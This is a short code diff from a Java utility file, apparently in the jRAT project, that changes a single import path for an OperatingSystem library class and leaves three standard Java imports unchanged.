@@ -1,6 +1,6 @@
 package io.jrat.common.utils;
 
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 import java.awt.GraphicsEnvironment;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
